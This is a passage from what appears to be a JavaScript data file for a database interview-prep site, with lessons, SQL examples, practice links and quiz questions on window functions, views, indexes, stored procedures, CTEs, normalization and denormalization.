    SUM(amount)   OVER (PARTITION BY dept) AS dept_total,
    AVG(amount)   OVER (PARTITION BY dept) AS dept_avg,
    amount - AVG(amount) OVER (PARTITION BY dept) AS diff_from_avg
FROM Sales;

-- 5. LAG and LEAD
SELECT emp_name, sale_date, amount,
    LAG(amount, 1)  OVER (PARTITION BY emp_name ORDER BY sale_date) AS prev_sale,
    LEAD(amount, 1) OVER (PARTITION BY emp_name ORDER BY sale_date) AS next_sale,
    amount - LAG(amount, 1) OVER (
        PARTITION BY emp_name ORDER BY sale_date
    ) AS growth
FROM Sales;

-- 6. NTILE: quartiles of sales amounts
SELECT emp_name, amount,
    NTILE(4) OVER (ORDER BY amount) AS quartile
FROM Sales;

-- 7. Moving average (3-row window)
SELECT sale_date, amount,
    ROUND(AVG(amount) OVER (
        ORDER BY sale_date
        ROWS BETWEEN 2 PRECEDING AND CURRENT ROW
    ), 2) AS moving_avg_3
FROM Sales;

-- 8. Cumulative distribution
SELECT emp_name, amount,
    CUME_DIST()    OVER (ORDER BY amount) AS cume_dist,
    PERCENT_RANK() OVER (ORDER BY amount) AS pct_rank
FROM Sales;

-- 9. FIRST_VALUE and LAST_VALUE
SELECT emp_name, dept, amount,
    FIRST_VALUE(emp_name) OVER (
        PARTITION BY dept ORDER BY amount DESC
    ) AS top_seller,
    LAST_VALUE(emp_name) OVER (
        PARTITION BY dept ORDER BY amount DESC
        ROWS BETWEEN UNBOUNDED PRECEDING AND UNBOUNDED FOLLOWING
    ) AS bottom_seller
FROM Sales;`,
          problems: [
            ['Rank Scores - LeetCode', 'https://leetcode.com/problems/rank-scores/', 'Medium'],
            ['Department Top Three Salaries', 'https://leetcode.com/problems/department-top-three-salaries/', 'Hard'],
            ['Consecutive Numbers', 'https://leetcode.com/problems/consecutive-numbers/', 'Medium']
          ],
          mcqs: [
            {q: 'For values (100, 100, 90), what does RANK() return?', o: ['1, 2, 3', '1, 1, 2', '1, 1, 3', '1, 2, 2'], a: 2},
            {q: 'Which window function accesses a value from the previous row?', o: ['LEAD()', 'LAG()', 'FIRST_VALUE()', 'NTH_VALUE()'], a: 1},
            {q: 'What is the default window frame when ORDER BY is specified in a window function?', o: ['ROWS BETWEEN UNBOUNDED PRECEDING AND UNBOUNDED FOLLOWING', 'RANGE BETWEEN UNBOUNDED PRECEDING AND CURRENT ROW', 'ROWS BETWEEN 1 PRECEDING AND 1 FOLLOWING', 'No frame is applied'], a: 1}
          ]
        },
        {
          t: 'Views, Indexes & Stored Procedures',
          learn: '<div class="learn-section"><div class="learn-h">Views</div><p class="learn-p">A <b>view</b> is a virtual table based on the result of a SQL query. It does not store data itself — it is a saved query that is executed each time the view is referenced.</p><div class="learn-code">CREATE VIEW HighEarners AS\nSELECT name, salary, dept_id\nFROM Employees\nWHERE salary &gt; 90000;</div><p class="learn-p"><b>Advantages of views:</b></p><ul class="learn-list"><li><b>Simplification</b> — Complex queries can be encapsulated in a view</li><li><b>Security</b> — Restrict access to specific columns/rows</li><li><b>Logical data independence</b> — Schema changes hidden behind the view</li><li><b>Consistency</b> — Reuse the same query logic across applications</li></ul><p class="learn-p"><b>Updatable views</b>: A view is updatable if it maps directly to a single base table without aggregations, DISTINCT, GROUP BY, HAVING, UNION, or subqueries. Inserting/updating through the view modifies the base table.</p><div class="learn-warn"><b>Warning:</b> A common interview question: "Can you insert into a view?" The answer is yes, <b>only if</b> the view is updatable and all NOT NULL columns of the base table (without defaults) are present in the view.</div><p class="learn-p"><b>Materialized Views</b> store the result physically and must be refreshed. They trade storage for read performance. Not available in MySQL, but supported in PostgreSQL and Oracle.</p></div><div class="learn-section"><div class="learn-h">Indexes</div><p class="learn-p">An <b>index</b> is a data structure that improves the speed of data retrieval at the cost of additional storage and slower writes. Think of it as a book\'s index — instead of reading every page, you look up the topic and jump to the right page.</p><table class="learn-table"><tr><th>Index Type</th><th>Description</th><th>Use Case</th></tr><tr><td>B-Tree Index</td><td>Balanced tree; default in most RDBMS</td><td>Equality, range queries, ORDER BY</td></tr><tr><td>Hash Index</td><td>Hash table-based</td><td>Exact equality lookups only</td></tr><tr><td>Composite Index</td><td>Index on multiple columns</td><td>Multi-column WHERE/ORDER BY</td></tr><tr><td>Unique Index</td><td>Enforces uniqueness</td><td>Unique constraints</td></tr><tr><td>Full-Text Index</td><td>Optimized for text search</td><td>LIKE, full-text search</td></tr><tr><td>Clustered Index</td><td>Data rows sorted by index key</td><td>Primary key (InnoDB)</td></tr><tr><td>Non-Clustered</td><td>Separate structure pointing to data</td><td>Secondary indexes</td></tr></table><div class="learn-code">-- Create indexes\nCREATE INDEX idx_emp_salary ON Employees(salary);\nCREATE INDEX idx_emp_dept_salary ON Employees(dept_id, salary);\nCREATE UNIQUE INDEX idx_emp_email ON Employees(email);\n\n-- Show indexes\nSHOW INDEX FROM Employees;\n\n-- Drop index\nDROP INDEX idx_emp_salary ON Employees;</div><div class="learn-tip"><b>Tip:</b> For a composite index on (A, B, C), queries filtering on A, (A, B), or (A, B, C) can use the index. But a query filtering only on B or C cannot use this index efficiently — this is the <b>leftmost prefix rule</b>.</div><p class="learn-p"><b>When NOT to use indexes:</b></p><ul class="learn-list"><li>Small tables (full scan is faster)</li><li>Columns with low cardinality (e.g., boolean)</li><li>Tables with heavy write operations</li><li>Columns rarely used in WHERE/JOIN/ORDER BY</li></ul></div><div class="learn-section"><div class="learn-h">Stored Procedures and Functions</div><p class="learn-p">A <b>stored procedure</b> is a precompiled collection of SQL statements stored in the database. It can accept parameters, contain control flow logic, and perform complex operations.</p><div class="learn-code">DELIMITER //\nCREATE PROCEDURE GetEmployeesByDept(IN dept VARCHAR(50))\nBEGIN\n    SELECT name, salary\n    FROM Employees\n    WHERE dept_id = (\n        SELECT dept_id FROM Departments WHERE dept_name = dept\n    )\n    ORDER BY salary DESC;\nEND //\nDELIMITER ;\n\n-- Call the procedure\nCALL GetEmployeesByDept(\'Engineering\');</div><p class="learn-p"><b>Stored Functions</b> return a single value and can be used in SQL expressions:</p><div class="learn-code">DELIMITER //\nCREATE FUNCTION GetTaxAmount(salary DECIMAL(10,2))\nRETURNS DECIMAL(10,2)\nDETERMINISTIC\nBEGIN\n    IF salary &gt; 100000 THEN RETURN salary * 0.30;\n    ELSEIF salary &gt; 50000 THEN RETURN salary * 0.20;\n    ELSE RETURN salary * 0.10;\n    END IF;\nEND //\nDELIMITER ;</div><p class="learn-p"><b>Advantages</b>: Reduced network traffic, code reuse, security (EXECUTE privilege without table access), precompilation.</p><p class="learn-p"><b>Disadvantages</b>: Harder to debug, vendor lock-in, can become hard to maintain.</p></div><div class="learn-section"><div class="learn-h">Triggers</div><p class="learn-p">A <b>trigger</b> is a stored procedure that automatically executes in response to specific events (INSERT, UPDATE, DELETE) on a table.</p><div class="learn-code">CREATE TRIGGER before_salary_update\nBEFORE UPDATE ON Employees\nFOR EACH ROW\nBEGIN\n    IF NEW.salary &lt; 0 THEN\n        SIGNAL SQLSTATE \'45000\'\n        SET MESSAGE_TEXT = \'Salary cannot be negative\';\n    END IF;\n    INSERT INTO Salary_Audit(emp_id, old_salary, new_salary, changed_at)\n    VALUES (OLD.emp_id, OLD.salary, NEW.salary, NOW());\nEND;</div><p class="learn-p">Triggers can be <b>BEFORE</b> or <b>AFTER</b> and can fire on <b>INSERT</b>, <b>UPDATE</b>, or <b>DELETE</b>. Use <code>OLD</code> to reference pre-change values and <code>NEW</code> for post-change values.</p><div class="learn-warn"><b>Warning:</b> Triggers can cause unexpected cascading effects and make debugging difficult. Use them sparingly and document them well.</div></div>',
          code: `-- =============================================
-- Views, Indexes & Stored Procedures
-- =============================================

-- ========== VIEWS ==========

-- Simple view
CREATE VIEW ActiveEmployees AS
SELECT emp_id, name, dept_id, salary
FROM Employees
WHERE status = 'active';

-- View with join
CREATE VIEW EmployeeDeptView AS
SELECT e.emp_id, e.name, d.dept_name, e.salary
FROM Employees e
JOIN Departments d ON e.dept_id = d.dept_id;

-- Using a view
SELECT * FROM EmployeeDeptView WHERE salary > 80000;

-- Updatable view (single table, no aggregates)
CREATE VIEW EngineeringSalaries AS
SELECT emp_id, name, salary
FROM Employees
WHERE dept_id = 10
WITH CHECK OPTION;  -- prevents inserting rows that don't satisfy WHERE

-- Update through view
UPDATE EngineeringSalaries SET salary = 120000 WHERE emp_id = 5;

-- Drop view
DROP VIEW IF EXISTS ActiveEmployees;

-- ========== INDEXES ==========

-- Single column index
CREATE INDEX idx_salary ON Employees(salary);

-- Composite index (leftmost prefix rule applies)
CREATE INDEX idx_dept_salary ON Employees(dept_id, salary);

-- Unique index
CREATE UNIQUE INDEX idx_email ON Employees(email);

-- Analyze query plan
EXPLAIN SELECT * FROM Employees WHERE dept_id = 10 AND salary > 90000;
-- Should use idx_dept_salary

-- Queries that CAN use idx_dept_salary:
-- WHERE dept_id = 10
-- WHERE dept_id = 10 AND salary > 90000
-- Queries that CANNOT:
-- WHERE salary > 90000 (does not use leftmost prefix)

-- ========== STORED PROCEDURES ==========

DELIMITER //

-- Procedure with IN parameter
CREATE PROCEDURE RaiseSalary(
    IN p_dept_id INT,
    IN p_percent DECIMAL(5,2)
)
BEGIN
    UPDATE Employees
    SET salary = salary * (1 + p_percent / 100)
    WHERE dept_id = p_dept_id;

    SELECT CONCAT('Updated ', ROW_COUNT(), ' employees') AS result;
END //

-- Procedure with IN/OUT parameters
CREATE PROCEDURE GetDeptStats(
    IN  p_dept_id INT,
    OUT p_count   INT,
    OUT p_avg_sal DECIMAL(10,2)
)
BEGIN
    SELECT COUNT(*), AVG(salary)
    INTO p_count, p_avg_sal
    FROM Employees
    WHERE dept_id = p_dept_id;
END //

DELIMITER ;

-- Call procedures
CALL RaiseSalary(10, 5.00);
CALL GetDeptStats(10, @cnt, @avg);
SELECT @cnt AS count, @avg AS avg_salary;

-- ========== TRIGGERS ==========

DELIMITER //
CREATE TRIGGER audit_salary_change
AFTER UPDATE ON Employees
FOR EACH ROW
BEGIN
    IF OLD.salary <> NEW.salary THEN
        INSERT INTO Salary_Audit(emp_id, old_sal, new_sal, changed_at)
        VALUES (OLD.emp_id, OLD.salary, NEW.salary, NOW());
    END IF;
END //
DELIMITER ;`,
          problems: [
            ['Create a View - HackerRank', 'https://www.hackerrank.com/challenges/the-report/problem', 'Medium'],
            ['Index Optimization', 'https://www.geeksforgeeks.org/indexing-in-databases-set-1/', 'Medium'],
            ['Stored Procedures Basics', 'https://www.hackerrank.com/challenges/occupations/problem', 'Medium']
          ],
          mcqs: [
            {q: 'A materialized view differs from a regular view in that:', o: ['It can accept parameters', 'It stores the result set physically and must be refreshed', 'It is always updatable', 'It cannot join multiple tables'], a: 1},
            {q: 'For a composite index on (A, B, C), which WHERE clause can use the index efficiently?', o: ['WHERE B = 5', 'WHERE C = 10', 'WHERE A = 1 AND B = 2', 'WHERE B = 2 AND C = 3'], a: 2},
            {q: 'Which keyword in a trigger refers to the row values BEFORE the update?', o: ['NEW', 'OLD', 'BEFORE', 'PREVIOUS'], a: 1}
          ]
        },
        {
          t: 'CTEs, Set Operations & CASE',
          learn: '<div class="learn-section"><div class="learn-h">Common Table Expressions (WITH Clause)</div><p class="learn-p">A <b>CTE</b> is a named temporary result set that exists only during query execution. It makes complex queries more readable than nested subqueries.</p><div class="learn-code">WITH high_earners AS (\n    SELECT department_id, name, salary\n    FROM employees\n    WHERE salary &gt; 100000\n)\nSELECT department_id, COUNT(*) AS count\nFROM high_earners\nGROUP BY department_id;</div><p class="learn-p">CTEs can reference each other and be used multiple times in the main query — unlike subqueries which are re-evaluated each time.</p></div><div class="learn-section"><div class="learn-h">Recursive CTEs</div><p class="learn-p"><b>Recursive CTEs</b> have a base case and a recursive step joined by <code>UNION ALL</code>. Essential for hierarchical data (org charts, tree structures, bill of materials).</p><div class="learn-code">-- Employee hierarchy: who reports to whom\nWITH RECURSIVE org_chart AS (\n    -- Base: CEO (no manager)\n    SELECT id, name, manager_id, 1 AS level\n    FROM employees WHERE manager_id IS NULL\n    UNION ALL\n    -- Recursive: employees under each manager\n    SELECT e.id, e.name, e.manager_id, o.level + 1\n    FROM employees e\n    JOIN org_chart o ON e.manager_id = o.id\n)\nSELECT * FROM org_chart ORDER BY level, name;</div><div class="learn-warn"><b>Warning:</b> Recursive CTEs can infinite-loop without a proper termination condition. Always ensure the recursive step eventually returns no rows. Add <code>LIMIT</code> or a depth check as a safety net.</div></div><div class="learn-section"><div class="learn-h">Set Operations</div><table class="learn-table"><tr><th>Operation</th><th>Behavior</th><th>Duplicates</th></tr><tr><td>UNION</td><td>Combines results from two queries</td><td>Removed</td></tr><tr><td>UNION ALL</td><td>Combines results from two queries</td><td>Kept (faster)</td></tr><tr><td>INTERSECT</td><td>Only rows in both queries</td><td>Removed</td></tr><tr><td>EXCEPT / MINUS</td><td>Rows in first but not second</td><td>Removed</td></tr></table><p class="learn-p">All set operations require the same number of columns with compatible data types. <code>UNION ALL</code> is faster than <code>UNION</code> because it skips the deduplication step.</p><div class="learn-code">-- Cities where we have customers OR suppliers\nSELECT city FROM customers\nUNION\nSELECT city FROM suppliers;\n\n-- Orders that were NOT refunded\nSELECT order_id FROM orders\nEXCEPT\nSELECT order_id FROM refunds;</div></div><div class="learn-section"><div class="learn-h">CASE Expression</div><p class="learn-p">CASE provides if/else logic inside SQL queries. Two forms:</p><div class="learn-code">-- Simple CASE (compare one value)\nSELECT name,\n    CASE grade\n        WHEN \'A\' THEN \'Excellent\'\n        WHEN \'B\' THEN \'Good\'\n        ELSE \'Needs Improvement\'\n    END AS performance\nFROM students;\n\n-- Searched CASE (arbitrary conditions)\nSELECT name, salary,\n    CASE\n        WHEN salary &gt; 100000 THEN \'High\'\n        WHEN salary &gt; 50000 THEN \'Mid\'\n        ELSE \'Entry\'\n    END AS band\nFROM employees;</div><p class="learn-p"><b>Conditional aggregation</b> — one of the most powerful patterns:</p><div class="learn-code">-- Pivot: count by department and gender in one query\nSELECT department,\n    SUM(CASE WHEN gender = \'M\' THEN 1 ELSE 0 END) AS male_count,\n    SUM(CASE WHEN gender = \'F\' THEN 1 ELSE 0 END) AS female_count\nFROM employees\nGROUP BY department;</div></div><div class="learn-section"><div class="learn-h">COALESCE &amp; NULLIF</div><p class="learn-p"><code>COALESCE(a, b, c)</code> returns the first non-NULL argument. Useful for defaults:</p><div class="learn-code">SELECT name, COALESCE(phone, email, \'No contact\') AS contact\nFROM users;\n-- NULLIF(a, b) returns NULL if a = b, otherwise a\n-- Useful to avoid division by zero:\nSELECT revenue / NULLIF(costs, 0) AS margin FROM sales;</div><div class="learn-tip"><b>Interview tip:</b> CTEs + CASE + window functions is the power combo for SQL interviews. Practice converting nested subqueries to CTEs for readability, and use conditional aggregation for pivot-style queries.</div></div>',
          code: `-- CTEs, Set Operations & CASE Examples

-- Recursive CTE: Generate numbers 1 to 10
WITH RECURSIVE nums AS (
    SELECT 1 AS n
    UNION ALL
    SELECT n + 1 FROM nums WHERE n < 10
)
SELECT * FROM nums;

-- Recursive CTE: Employee hierarchy with path
WITH RECURSIVE org AS (
    SELECT id, name, manager_id,
           CAST(name AS CHAR(200)) AS path, 1 AS depth
    FROM employees WHERE manager_id IS NULL
    UNION ALL
    SELECT e.id, e.name, e.manager_id,
           CONCAT(o.path, ' > ', e.name), o.depth + 1
    FROM employees e JOIN org o ON e.manager_id = o.id
)
SELECT * FROM org ORDER BY depth;

-- Conditional aggregation (pivot without PIVOT keyword)
SELECT
    YEAR(order_date) AS year,
    SUM(CASE WHEN MONTH(order_date) = 1 THEN amount ELSE 0 END) AS Jan,
    SUM(CASE WHEN MONTH(order_date) = 2 THEN amount ELSE 0 END) AS Feb,
    SUM(CASE WHEN MONTH(order_date) = 3 THEN amount ELSE 0 END) AS Mar
FROM orders
GROUP BY YEAR(order_date);

-- Running total using CTE
WITH ordered_sales AS (
    SELECT *, ROW_NUMBER() OVER (ORDER BY sale_date) AS rn
    FROM sales
)
SELECT sale_date, amount,
    SUM(amount) OVER (ORDER BY sale_date) AS running_total
FROM ordered_sales;

-- EXCEPT: Find customers who never ordered
SELECT customer_id FROM customers
EXCEPT
SELECT DISTINCT customer_id FROM orders;

-- COALESCE with multiple fallbacks
SELECT
    product_name,
    COALESCE(discount_price, regular_price, 0) AS final_price
FROM products;`,
          problems: [
            ['Department Top Three Salaries', 'https://leetcode.com/problems/department-top-three-salaries/', 'Hard'],
            ['Consecutive Numbers', 'https://leetcode.com/problems/consecutive-numbers/', 'Medium'],
            ['Tree Node', 'https://leetcode.com/problems/tree-node/', 'Medium'],
            ['Nth Highest Salary', 'https://leetcode.com/problems/nth-highest-salary/', 'Medium']
          ],
          mcqs: [
            {q: 'What is the difference between UNION and UNION ALL?', o: ['UNION sorts, UNION ALL does not', 'UNION removes duplicates, UNION ALL keeps all rows', 'UNION ALL is slower because it checks for duplicates', 'There is no difference'], a: 1},
            {q: 'Which keyword makes a CTE recursive?', o: ['LOOP', 'RECURSIVE (after WITH)', 'ITERATE', 'REPEAT'], a: 1},
            {q: 'What does COALESCE(NULL, NULL, 5, 3) return?', o: ['NULL', '3', '5', 'Error'], a: 2}
          ]
        }
      ]
    },
    {
      id: 'norm', t: 'Normalization',
      topics: [
        {
          t: 'Normalization (1NF, 2NF, 3NF, BCNF)',
          learn: '<div class="learn-section"><div class="learn-h">What is Normalization?</div><p class="learn-p"><b>Normalization</b> is the process of organizing a relational database to reduce <b>data redundancy</b> and prevent <b>update anomalies</b> (insertion, deletion, modification anomalies). It involves decomposing a table into smaller tables while preserving data integrity through functional dependencies.</p><p class="learn-p"><b>Why normalize?</b></p><ul class="learn-list"><li><b>Insertion anomaly</b> — Cannot insert data without other unrelated data (e.g., can\'t add a new department unless it has employees)</li><li><b>Deletion anomaly</b> — Deleting data causes unintended loss of other data (e.g., deleting the last employee in a dept loses the dept info)</li><li><b>Update anomaly</b> — Changing data requires updating multiple rows (e.g., if dept name is stored with each employee, renaming a dept requires updating all employee rows)</li></ul></div><div class="learn-section"><div class="learn-h">First Normal Form (1NF)</div><p class="learn-p">A relation is in <b>1NF</b> if:</p><ol class="learn-list"><li>All attributes contain only <b>atomic (indivisible) values</b> — no multi-valued or composite attributes</li><li>Each column has a <b>unique name</b></li><li>The <b>order of rows and columns</b> does not matter</li><li>Each row is <b>unique</b> (has a primary key)</li></ol><div class="learn-code">-- NOT in 1NF (multi-valued attribute)\n| emp_id | name  | phone_numbers       |\n|--------|-------|--------------------|\n| 1      | Alice | 9876, 1234, 5678   |\n\n-- In 1NF (separate rows or separate table)\n| emp_id | name  | phone_number |\n|--------|-------|-------------|\n| 1      | Alice | 9876        |\n| 1      | Alice | 1234        |\n| 1      | Alice | 5678        |</div></div><div class="learn-section"><div class="learn-h">Second Normal Form (2NF)</div><p class="learn-p">A relation is in <b>2NF</b> if:</p><ol class="learn-list"><li>It is in 1NF</li><li>Every <b>non-prime attribute</b> is <b>fully functionally dependent</b> on the <b>entire</b> candidate key (no partial dependency)</li></ol><p class="learn-p"><b>Partial dependency</b> occurs when a non-prime attribute depends on only <b>part</b> of a composite candidate key. This only applies when the candidate key is composite.</p><div class="learn-code">-- NOT in 2NF\nEnrollment(student_id, course_id, student_name, grade)\nFDs: {student_id, course_id} -> grade   (full dependency)\n     student_id -> student_name          (partial dependency!)\n\n-- Fix: Decompose\nStudent(student_id, student_name)\nEnrollment(student_id, course_id, grade)</div><div class="learn-tip"><b>Tip:</b> If a relation has a single-attribute candidate key (not composite), it is automatically in 2NF if it is in 1NF (partial dependency is impossible).</div></div><div class="learn-section"><div class="learn-h">Third Normal Form (3NF)</div><p class="learn-p">A relation is in <b>3NF</b> if:</p><ol class="learn-list"><li>It is in 2NF</li><li>No <b>non-prime attribute</b> is <b>transitively dependent</b> on the candidate key</li></ol><p class="learn-p"><b>Formal definition</b>: For every FD X → Y, at least one of the following holds:</p><ul class="learn-list"><li>X → Y is trivial (Y ⊆ X)</li><li>X is a superkey</li><li>Y is a prime attribute (part of some candidate key)</li></ul><div class="learn-code">-- NOT in 3NF\nEmployee(emp_id, dept_id, dept_name)\nFDs: emp_id -> dept_id      (OK)\n     dept_id -> dept_name    (transitive: emp_id -> dept_id -> dept_name)\n\n-- Fix: Decompose\nEmployee(emp_id, dept_id)\nDepartment(dept_id, dept_name)</div><div class="learn-warn"><b>Warning:</b> A common mistake is thinking 3NF means "no transitive dependency." The precise condition is that Y must be a prime attribute OR X must be a superkey. If Y is part of a candidate key, the transitive dependency is allowed in 3NF.</div></div><div class="learn-section"><div class="learn-h">Boyce-Codd Normal Form (BCNF)</div><p class="learn-p"><b>BCNF</b> is a stricter version of 3NF. For every FD X → Y:</p><ul class="learn-list"><li>X → Y is trivial, OR</li><li>X is a <b>superkey</b></li></ul><p class="learn-p">The difference from 3NF: BCNF does <b>not</b> have the exception "Y is a prime attribute." So if a prime attribute is determined by a non-superkey, it violates BCNF but may satisfy 3NF.</p><div class="learn-code">-- In 3NF but NOT in BCNF\nTeaching(student, subject, teacher)\nFDs: {student, subject} -> teacher\n     teacher -> subject\n\nCandidate keys: {student, subject}, {student, teacher}\nCheck teacher -> subject: teacher is NOT a superkey, but subject\nis a prime attribute. So 3NF is satisfied.\nBut BCNF is violated because teacher is not a superkey.\n\n-- Fix: Decompose\nTeacherSubject(teacher, subject)\nStudentTeacher(student, teacher)</div><table class="learn-table"><tr><th>Normal Form</th><th>Requirement</th><th>Eliminates</th></tr><tr><td>1NF</td><td>Atomic values, unique rows</td><td>Repeating groups</td></tr><tr><td>2NF</td><td>1NF + no partial dependencies</td><td>Partial dependencies</td></tr><tr><td>3NF</td><td>2NF + no transitive dependencies (with prime attr exception)</td><td>Transitive dependencies</td></tr><tr><td>BCNF</td><td>For every X→Y, X is a superkey</td><td>All redundancy from FDs</td></tr></table></div><div class="learn-section"><div class="learn-h">Decomposition Properties</div><p class="learn-p">When decomposing a relation, two properties must be preserved:</p><ol class="learn-list"><li><b>Lossless-join decomposition</b> — The original table can be reconstructed by joining the decomposed tables (no spurious tuples). Guaranteed if the common attributes form a superkey of at least one decomposed table.</li><li><b>Dependency preservation</b> — All original FDs can be checked using the decomposed tables alone, without performing a join.</li></ol><p class="learn-p">3NF decomposition can always achieve <b>both</b> lossless-join and dependency-preserving decomposition. BCNF decomposition is always lossless-join but may <b>not</b> preserve all dependencies.</p><div class="learn-tip"><b>Tip:</b> In interviews, always mention both properties when discussing decomposition. "BCNF gives lossless-join but may sacrifice dependency preservation; 3NF guarantees both."</div></div><div class="learn-section"><div class="learn-h">Fourth Normal Form (4NF)</div><p class="learn-p"><b>4NF</b> deals with <b>multivalued dependencies (MVDs)</b>. A relation is in 4NF if for every non-trivial MVD X →→ Y, X is a superkey.</p><p class="learn-p"><b>Multivalued dependency</b> X →→ Y means: for a given X value, the set of Y values is independent of the other attributes. Unlike FDs, MVDs produce <b>sets</b> of values.</p><div class="learn-code">-- NOT in 4NF:\nEmpSkillLang(emp_id, skill, language)\n\n| emp_id | skill  | language |\n|--------|--------|----------|\n| 1      | Java   | English  |\n| 1      | Java   | French   |\n| 1      | Python | English  |\n| 1      | Python | French   |\n\nMVDs: emp_id →→ skill and emp_id →→ language\n(skills and languages are independent of each other)\n\n-- Fix: Decompose into:\nEmpSkill(emp_id, skill)\nEmpLang(emp_id, language)</div><div class="learn-warn"><b>Warning:</b> If MVDs exist in a BCNF relation, it causes data redundancy — you must list every combination of independent attributes. 4NF eliminates this by decomposing based on MVDs.</div></div><div class="learn-section"><div class="learn-h">Minimal Cover (Canonical Cover)</div><p class="learn-p">A <b>minimal cover</b> (Fc) of a set of FDs F is a reduced set that is equivalent to F (same closure) but has:</p><ol class="learn-list"><li>Every FD has a <b>single attribute</b> on the right side</li><li>No <b>extraneous attributes</b> on the left side (can\'t remove any left attribute without changing the closure)</li><li>No <b>redundant FDs</b> (can\'t remove any FD without changing the closure)</li></ol><div class="learn-code">Algorithm to find Minimal Cover:\n1. Split RHS: A → BC becomes A → B, A → C\n2. Remove extraneous LHS attributes:\n   For AB → C, check if A⁺ (under remaining FDs) contains C\n   If yes, AB → C can be reduced to A → C\n3. Remove redundant FDs:\n   For each FD X → Y, remove it temporarily\n   If X⁺ (under remaining FDs) still contains Y, it\'s redundant\n\nExample: F = {A → BC, B → C, AB → D}\nStep 1: {A → B, A → C, B → C, AB → D}\nStep 2: AB → D: A⁺ = {A,B,C,D} (via A→B, B→C, and we check A→D)\n        Since A⁺ includes D, reduce to A → D\nStep 3: A → C: Remove it. A⁺ = {A,B,D} (via A→B, A→D). C not in A⁺.\n        But B⁺ = {B,C}. So A⁺ with B→C = {A,B,C,D}. A→C is redundant!\nFc = {A → B, B → C, A → D}</div><div class="learn-tip"><b>Interview tip:</b> Minimal cover is used in the 3NF decomposition algorithm (synthesis algorithm). For each FD X → Y in Fc, create a relation {X, Y}. Then ensure at least one relation contains a candidate key.</div></div>',
          code: `-- =============================================
-- Normalization: Step-by-Step Examples
-- =============================================

-- ===== UNNORMALIZED TABLE =====
-- StudentCourse(student_id, name, phone_numbers, course_id,
--               course_name, instructor, instructor_dept, grade)
-- Problems: multi-valued phone, partial deps, transitive deps

-- ===== 1NF: Eliminate multi-valued attributes =====
CREATE TABLE StudentCourse_1NF (
    student_id      INT,
    name            VARCHAR(100),
    course_id       INT,
    course_name     VARCHAR(100),
    instructor      VARCHAR(100),
    instructor_dept VARCHAR(100),
    grade           CHAR(2),
    PRIMARY KEY (student_id, course_id)
);
-- Phone numbers moved to separate table
CREATE TABLE StudentPhone (
    student_id   INT,
    phone_number VARCHAR(15),
    PRIMARY KEY (student_id, phone_number),
    FOREIGN KEY (student_id) REFERENCES StudentCourse_1NF(student_id)
);

-- ===== 2NF: Eliminate partial dependencies =====
-- FDs: student_id -> name
--      course_id -> course_name, instructor, instructor_dept
--      {student_id, course_id} -> grade
-- Partial deps: student_id -> name, course_id -> course_name, etc.

CREATE TABLE Student_2NF (
    student_id INT PRIMARY KEY,
    name       VARCHAR(100)
);

CREATE TABLE Course_2NF (
    course_id       INT PRIMARY KEY,
    course_name     VARCHAR(100),
    instructor      VARCHAR(100),
    instructor_dept VARCHAR(100)
);

CREATE TABLE Enrollment_2NF (
    student_id INT,
    course_id  INT,
    grade      CHAR(2),
    PRIMARY KEY (student_id, course_id),
    FOREIGN KEY (student_id) REFERENCES Student_2NF(student_id),
    FOREIGN KEY (course_id) REFERENCES Course_2NF(course_id)
);

-- ===== 3NF: Eliminate transitive dependencies =====
-- In Course_2NF: course_id -> instructor -> instructor_dept
-- (transitive dependency)

CREATE TABLE Instructor_3NF (
    instructor      VARCHAR(100) PRIMARY KEY,
    instructor_dept VARCHAR(100)
);

CREATE TABLE Course_3NF (
    course_id   INT PRIMARY KEY,
    course_name VARCHAR(100),
    instructor  VARCHAR(100),
    FOREIGN KEY (instructor) REFERENCES Instructor_3NF(instructor)
);

-- Student_2NF and Enrollment_2NF remain the same

-- ===== BCNF Example =====
-- Teaching(student, subject, teacher)
-- FDs: {student, subject} -> teacher, teacher -> subject
-- In 3NF (subject is prime) but NOT BCNF (teacher is not a superkey)

-- BCNF decomposition:
CREATE TABLE TeacherSubject (
    teacher VARCHAR(100) PRIMARY KEY,
    subject VARCHAR(100) NOT NULL
);

CREATE TABLE StudentTeacher (
    student VARCHAR(100),
    teacher VARCHAR(100),
    PRIMARY KEY (student, teacher),
    FOREIGN KEY (teacher) REFERENCES TeacherSubject(teacher)
);

-- Note: FD {student, subject} -> teacher is lost!
-- We cannot verify it without joining the two tables.
-- This is the trade-off of BCNF vs 3NF.

-- ===== Verification Query =====
-- Check if decomposition is lossless:
-- Common attribute (teacher) is a key of TeacherSubject -> lossless!`,
          problems: [
            ['Normalization Practice', 'https://www.geeksforgeeks.org/normal-forms-in-dbms/', 'Medium'],
            ['BCNF Decomposition', 'https://www.geeksforgeeks.org/boyce-codd-normal-form-bcnf/', 'Hard'],
            ['Finding Candidate Keys', 'https://www.geeksforgeeks.org/finding-candidate-keys-of-a-relation/', 'Medium']
          ],
          mcqs: [
            {q: 'A relation with a single-attribute primary key is automatically in at least:', o: ['1NF only', '2NF (if in 1NF)', '3NF', 'BCNF'], a: 1},
            {q: 'Which normal form can always achieve both lossless-join and dependency-preserving decomposition?', o: ['1NF', '2NF', '3NF', 'BCNF'], a: 2},
            {q: 'A relation is in 3NF but not BCNF. This is possible when:', o: ['There is a partial dependency', 'A prime attribute is determined by a non-superkey', 'There is a multivalued dependency', 'The table has no candidate key'], a: 1}
          ]
        },
        {
          t: 'Denormalization',
          learn: '<div class="learn-section"><div class="learn-h">What is Denormalization?</div><p class="learn-p"><b>Denormalization</b> is the intentional introduction of redundancy into a normalized database to <b>improve read performance</b>. While normalization minimizes redundancy and update anomalies, denormalization accepts controlled redundancy in exchange for faster queries (fewer JOINs).</p><p class="learn-p">Denormalization is <b>not</b> the absence of normalization — it is a deliberate design decision made <b>after</b> normalizing, when performance requirements demand it.</p></div><div class="learn-section"><div class="learn-h">When to Denormalize</div><ul class="learn-list"><li><b>Read-heavy workloads</b> — When SELECT queries vastly outnumber writes (e.g., reporting dashboards, analytics)</li><li><b>Frequent expensive JOINs</b> — Joining many tables for common queries</li><li><b>Aggregation queries</b> — Precomputing sums, counts, averages</li><li><b>Real-time requirements</b> — When milliseconds matter (e.g., trading systems at DE Shaw)</li><li><b>Distributed databases</b> — JOINs across partitions are very expensive</li></ul><div class="learn-warn"><b>Warning:</b> Denormalization increases write complexity (must update redundant data consistently), storage usage, and risk of data inconsistency. Always normalize first, then selectively denormalize based on measured performance needs.</div></div><div class="learn-section"><div class="learn-h">Denormalization Techniques</div><table class="learn-table"><tr><th>Technique</th><th>Description</th><th>Example</th></tr><tr><td>Adding redundant columns</td><td>Copy a column from a related table</td><td>Store dept_name directly in Employee 